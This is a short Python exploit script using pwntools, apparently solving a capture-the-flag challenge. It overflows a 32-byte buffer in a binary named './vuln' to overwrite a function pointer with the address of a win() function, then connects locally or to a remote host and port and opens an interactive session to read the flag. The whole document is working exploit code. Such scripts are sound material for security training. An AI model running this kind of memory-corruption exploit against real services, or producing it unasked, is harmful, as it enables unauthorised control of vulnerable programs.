from pwn import *

# Set up the target
context.log_level = 'debug'  # Enable verbose logging
binary = './vuln'  # Path to the binary (for local testing)
elf = ELF(binary)  # Load the binary for analysis

# Find the address of the win() function
win_address = elf.symbols['win']
log.info(f"Address of win(): {hex(win_address)}")

# Craft the payload
payload = b"A" * 32  # Fill the buffer
payload += p64(win_address)  # Overwrite the function pointer with win() address

# Connect to the challenge
if args.REMOTE:  # Use `python3 exploit.py REMOTE` for remote connection
    host = args.HOST or 'localhost'  # Default to localhost if no host is provided
    port = args.PORT or 1337  # Default to port 1337 if no port is provided
    io = remote(host, port)
else:  # Local testing
    io = process(binary)

# Send the payload
io.sendlineafter(b"Enter your payload: ", payload)

# Receive the flag
io.interactive()
